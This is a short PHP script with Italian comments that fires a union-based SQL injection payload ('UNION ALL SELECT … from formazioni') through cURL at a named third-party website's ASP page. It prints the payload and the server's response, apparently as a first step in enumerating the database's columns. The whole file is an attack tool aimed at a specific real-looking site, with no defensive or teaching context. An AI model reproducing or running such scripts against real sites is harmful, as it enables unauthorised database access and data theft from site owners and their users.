<?php 



for( $x = 0; $x < 1; $x++ ) {
    $index .= $x.',';
    echo 'http://www.fantatibur.it/formazioni/visu.asp?Id=184 UNION ALL SELECT '.trim( $index, ',' ).' from formazioni<br>';
    
    $ch = curl_init();

    // imposto la URL della risorsa remota da scaricare
    curl_setopt($ch, CURLOPT_URL, 'http://www.fantatibur.it/formazioni/visu.asp?Id=184 UNION ALL SELECT '.trim( $index, ',' ).' from formazioni');

    // imposto che non vengano scaricati gli header
    curl_setopt($ch, CURLOPT_HEADER, 0);

    // eseguo la chiamata
    echo curl_exec($ch);

    // chiudo cURL
    curl_close($ch);
    exit;
}